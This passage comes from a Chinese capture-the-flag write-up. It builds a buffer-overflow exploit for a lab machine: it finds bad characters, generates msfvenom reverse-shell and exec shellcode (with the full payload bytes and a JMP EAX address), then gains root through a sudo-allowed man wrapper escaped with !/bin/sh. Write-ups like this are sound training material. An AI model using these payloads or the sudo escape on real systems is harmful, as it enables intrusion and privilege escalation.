    python -c "print('A'*116+'BBBB'+'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0B\x0C\x0E\x0F\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0\xC1\xC2\xC3\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF')" > 1.txt

运行了一下，结果啥都没了

![1606792855_5fc5b697161b0a6b3ff63.png!small?1606792856226](https://image.3001.net/images/20201201/1606792855_5fc5b697161b0a6b3ff63.png!small?1606792856226)

这。。。铁定有坏字符了。我们分段去测试

如果嫌 edb 黑看不清楚，可以在 kali 中开下 undercover 模式

![1606792951_5fc5b6f7ead712ec79884.png!small?1606792953352](https://image.3001.net/images/20201201/1606792951_5fc5b6f7ead712ec79884.png!small?1606792953352)

![1606792959_5fc5b6ff1d578e67eb080.png!small?1606792960178](https://image.3001.net/images/20201201/1606792959_5fc5b6ff1d578e67eb080.png!small?1606792960178)

![1606792969_5fc5b7098759c4cebdab7.png!small?1606792970622](https://image.3001.net/images/20201201/1606792969_5fc5b7098759c4cebdab7.png!small?1606792970622)

把 **chars list** 一节节分段的丢来运行，最终找到找到坏字符 **\x46**

![1606793019_5fc5b73bef0d4706ba818.png!small?1606793021277](https://image.3001.net/images/20201201/1606793019_5fc5b73bef0d4706ba818.png!small?1606793021277)

去掉坏字符 **\x46** ，在跑跑试试：

![1606793083_5fc5b77be0bd107f46896.png!small?1606793085408](https://image.3001.net/images/20201201/1606793083_5fc5b77be0bd107f46896.png!small?1606793085408)

一切正常了，生成 shellcode 命令为：

    
    
    msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.129 LPORT=8888 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x46' -f python

![1606793107_5fc5b793313e13a07e37f.png!small?1606793108518](https://image.3001.net/images/20201201/1606793107_5fc5b793313e13a07e37f.png!small?1606793108518)

生成的 **shellcode** 大小为 **95 bytes** ，ok，116的空间能塞得下，甚至还能加点 nop 防止解码器弄坏
shellcode。

nop 长度为 **116-95=21**

接着修改下 **jmp eax** 的地址，注意需要倒着填入

    
    
    '\x90'*21 + "PAYLOAD"*95 + "JMP EAX"*4
    python -c "print('\x90'*21+'\xd9\xe1\xba\xfe\x22\x3c\x7d\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xae\x31\xde\x88\x7f\xed\xe9\x90\x2c\x52\x45\x3d\xd0\xdd\x88\x71\xb2\x10\xca\xe1\x63\x1b\xf4\xc8\x13\x12\x72\x2a\x7b\xaf\x8e\xc6\xfa\xc7\x8c\xd6\xde\xaf\x18\x37\xae\xb6\x4a\xe9\x9d\x85\x68\x80\xc0\x27\xee\xc0\x6a\xd6\xc0\x97\x02\x4e\x30\x77\xb0\xe7\xc7\x64\x66\xab\x5e\x8b\x36\x40\xac\xcc'+'\xaf\x84\x04\x08')" > 1.txt

运行看看，发现报错了：

![1606793253_5fc5b825048112c0e2e63.png!small?1606793254126](https://image.3001.net/images/20201201/1606793253_5fc5b825048112c0e2e63.png!small?1606793254126)

在 jmp eax 处下断点，从刚刚找 **jmp eax** 位置点击去，双击要跳转的地址，然后按 **f2** 下断点

![1606793380_5fc5b8a481298334b6697.png!small?1606793381707](https://image.3001.net/images/20201201/1606793380_5fc5b8a481298334b6697.png!small?1606793381707)

运行，按 **f7** 下一步，注意看 eax 位置开始的内存情况，发现解码器在解码 shellcode 的时候，由于空间太小，把 shellcode
改烂了：

![1606793420_5fc5b8cc8a5ef6f701292.png!small?1606793422097](https://image.3001.net/images/20201201/1606793420_5fc5b8cc8a5ef6f701292.png!small?1606793422097)![1606793428_5fc5b8d486ea4bff7aa56.png!small?1606793430020](https://image.3001.net/images/20201201/1606793428_5fc5b8d486ea4bff7aa56.png!small?1606793430020)

这里发现前面的 nop 没有被改值，试试将 nop 和 shellcode 换下位置：

    
    
    "PAYLOAD"*95 + '\x90'*21 + "JMP EAX"*4
    python -c "print('\xd9\xe1\xba\xfe\x22\x3c\x7d\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x12\x83\xc0\x04\x31\x50\x13\x03\xae\x31\xde\x88\x7f\xed\xe9\x90\x2c\x52\x45\x3d\xd0\xdd\x88\x71\xb2\x10\xca\xe1\x63\x1b\xf4\xc8\x13\x12\x72\x2a\x7b\xaf\x8e\xc6\xfa\xc7\x8c\xd6\xde\xaf\x18\x37\xae\xb6\x4a\xe9\x9d\x85\x68\x80\xc0\x27\xee\xc0\x6a\xd6\xc0\x97\x02\x4e\x30\x77\xb0\xe7\xc7\x64\x66\xab\x5e\x8b\x36\x40\xac\xcc'+'\x90'*21+'\xaf\x84\x04\x08')" > 1.txt

可惜还是报错了。不过比刚刚好点，这次监听端口收到了请求，但马上就关闭了。说明我们的思路是对的： 空间太小，解码器干扰到了 shellcode

![1606793456_5fc5b8f0aa5f581064c0b.png!small?1606793457748](https://image.3001.net/images/20201201/1606793456_5fc5b8f0aa5f581064c0b.png!small?1606793457748)

### shellcode 更换为执行命令

换下思路，我们已经拿到低权用户的反弹shell了，我们现在要做的是提权。提权我们直接运行个 /bin/bash 不就好了嘛。这样子 shellcode
的体积就会小很多了

更换 payload 为

    
    
    linux/x86/exec

我们先生成个执行 id 命令的 shellcode看看：

    
    
    msfvenom -p linux/x86/exec CMD="id" -b '\x00\x0a\x0d\x46' -f python
     #这里估计是 shellcode 太短了，没法用 x86/shikata_ga_nai 编码器，那我们就用默认的吧

shellcode 才64字节：

![1606793514_5fc5b92a1d4d045006743.png!small?1606793515381](https://image.3001.net/images/20201201/1606793514_5fc5b92a1d4d045006743.png!small?1606793515381)

重新计算填充的 nop 长度： **116-64=52**

新 payload：

    
    
    python -c "print('\x33\xc9\x83\xe9\xf6\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xe7\x95\x74\x23\x83\xee\xfc\xe2\xf4\x8d\x9e\x2c\xba\xb5\xf3\x1c\x0e\x84\x1c\x93\x4b\xc8\xe6\x1c\x23\x8f\xba\x16\x4a\x89\x1c\x97\x71\x0f\x96\x74\x23\xe7\xfc\x10\x23\xb0\xc6\xfd\xc2\x2a\x15\x74\x23'+'\x90'*52+'\xaf\x84\x04\x08')" > 1.txt

本地测试，完美：

![1606793554_5fc5b952bef741d26fbe3.png!small?1606793556076](https://image.3001.net/images/20201201/1606793554_5fc5b952bef741d26fbe3.png!small?1606793556076)

放靶机上测试，完美：

![1606793579_5fc5b96bd1e01f37acbce.png!small?1606793581236](https://image.3001.net/images/20201201/1606793579_5fc5b96bd1e01f37acbce.png!small?1606793581236)

更换命令为 /bin/bash -i

    
    
    msfvenom -p linux/x86/exec CMD="/bin/bash -i" -b '\x00\x0a\x0d\x46' -f python

然后就是常规操作，修改下 nop 长度啥的。最后丢到靶机上测试：

![1606793616_5fc5b9903e2b0498c3238.png!small?1606793617600](https://image.3001.net/images/20201201/1606793616_5fc5b9903e2b0498c3238.png!small?1606793617600)

哎，舒服了

提权至root

走到 /home/anansi/bin 目录下，发现。。。又一个程序？？？这是要把 pwn 玩到底啊

![1606793671_5fc5b9c7e39f37c06d495.png!small?1606793672962](https://image.3001.net/images/20201201/1606793671_5fc5b9c7e39f37c06d495.png!small?1606793672962)

不过所属用户不是 root，没有 pwn 的价值：

![1606793680_5fc5b9d0ec586341841b3.png!small?1606793682083](https://image.3001.net/images/20201201/1606793680_5fc5b9d0ec586341841b3.png!small?1606793682083)

看看这程序怎么用的

![1606793691_5fc5b9db104d3f3b9c6bb.png!small?1606793692122](https://image.3001.net/images/20201201/1606793691_5fc5b9db104d3f3b9c6bb.png!small?1606793692122)

尝试使用 proclist 参数，发现报错：

    
    
    TERM environment variable not set.

![1606793709_5fc5b9eddee489a7e46a5.png!small?1606793711250](https://image.3001.net/images/20201201/1606793709_5fc5b9eddee489a7e46a5.png!small?1606793711250)

我们只需要打一行命令即可：

    
    
    export TERM=xterm

爆了另一个错，算了先不管着。。

![1606793809_5fc5ba5178629a2c0b997.png!small?1606793810589](https://image.3001.net/images/20201201/1606793809_5fc5ba5178629a2c0b997.png!small?1606793810589)

暂时没有思路，看看 sudo -l

![1606793821_5fc5ba5db71f6ce21b267.png!small?1606793822948](https://image.3001.net/images/20201201/1606793821_5fc5ba5db71f6ce21b267.png!small?1606793822948)

啧啧啧，看来还是得肝 anansi_util

看看 anansi_util 的 manual 参数把：

    
    
    /home/anansi/bin/anansi_util manual id

![1606793862_5fc5ba8691a376effb6c7.png!small?1606793863677](https://image.3001.net/images/20201201/1606793862_5fc5ba8691a376effb6c7.png!small?1606793863677)

看来就是正常的 man 命令。

可如果想使用 man 命令提权，必须获得一个 **交互式 shell** ，不然是没法输入 !/bin/sh 的

但我们现在这个shell只是一个 **suid shell** ，不是正常的 shell，无法使用 python 创建 交互式shell：

![1606793889_5fc5baa152658e69caa2d.png!small?1606793890482](https://image.3001.net/images/20201201/1606793889_5fc5baa152658e69caa2d.png!small?1606793890482)

后面万般无奈，看了下 wp，没想到原来 puck 用户也可以 sudo /home/anansi/bin/anansi_util，根本不需要 平行移动到
anansi 用户：

![1606793902_5fc5baae6495377f2ab51.png!small?1606793903469](https://image.3001.net/images/20201201/1606793902_5fc5baae6495377f2ab51.png!small?1606793903469)

在 puck 权限中输入：

    
    
    python -c 'import pty; pty.spawn("/bin/bash")'

得到交互式shell：

![1606793922_5fc5bac2afd548cd2b6d1.png!small?1606793923831](https://image.3001.net/images/20201201/1606793922_5fc5bac2afd548cd2b6d1.png!small?1606793923831)

虽然外表看起来没啥变化，但此时我们是一个真正的交互式shell了：

![1606793966_5fc5baeeb328dc815b83e.png!small?1606793967921](https://image.3001.net/images/20201201/1606793966_5fc5baeeb328dc815b83e.png!small?1606793967921)

尝试使用 /home/anansi/bin/anansi_util 的 manual 参数提权：

    
    
    sudo /home/anansi/bin/anansi_util manual id
    !/bin/sh

Bingo!

![1606793990_5fc5bb06cd19d8787efcb.png!small?1606793991992](https://image.3001.net/images/20201201/1606793990_5fc5bb06cd19d8787efcb.png!small?1606793991992)

## 几个小技巧：

如果是非交互式shell卡住了，输入非预期的字符串让其强行退出：

![1606794032_5fc5bb30a72ca6c9ebca9.png!small?1606794033819](https://image.3001.net/images/20201201/1606794032_5fc5bb30a72ca6c9ebca9.png!small?1606794033819)

##  **最后**

关于这些小脚本，我在github简单创建了一个小项目，喜欢的师傅们赏个 star 呗 ==

https://github.com/xiaopan233/OSCP-Script

  

